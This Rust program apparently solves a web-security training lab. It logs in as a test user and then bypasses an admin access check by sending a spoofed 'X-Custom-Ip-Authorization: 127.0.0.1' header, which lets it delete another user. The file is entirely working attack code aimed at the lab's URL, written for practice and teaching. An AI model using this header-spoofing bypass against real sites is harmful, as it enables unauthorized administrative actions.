/**************************************************************
*
* Lab: Authentication bypass via information disclosure
*
* Hack Steps: 
*      1. Fetch the login page
*      2. Extract the session and the csrf token
*      3. Login as wiener
*      4. Extract the new session
*      5. Delete carlos from the admin panel bypassing access 
*         using a custom header
*
***************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a0f00f6043e20ec822c02080061002f.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let get_login = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗2⦘ Getting session and csrf token.. ");
    flush_terminal();

    let session = get_session_cookie(&get_login);
    let csrf_token = get_csrf_token(get_login);

    println!("{}", "OK".green());
    print!("⦗3⦘ Logging in as wiener.. ");
    flush_terminal();

    let login_as_wiener = login_as_wiener(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗4⦘ Getting a new session as wiener.. ");
    flush_terminal();

    let new_session = get_session_cookie(&login_as_wiener);

    println!("{}", "OK".green());
    print!("⦗5⦘ Deleting carlos from the admin panel bypassing access using a custom header.. ");
    flush_terminal();

    delete_carlos(&new_session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", csrf_token),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login".red()))
}

fn delete_carlos(session: &str) {
    WEB_CLIENT
        .get(format!("{LAB_URL}/admin/delete?username=carlos"))
        .header("Cookie", format!("session={session}"))
        .header("X-Custom-Ip-Authorization", "127.0.0.1")
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to delete carlos from the admin panel".red()
        ));
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
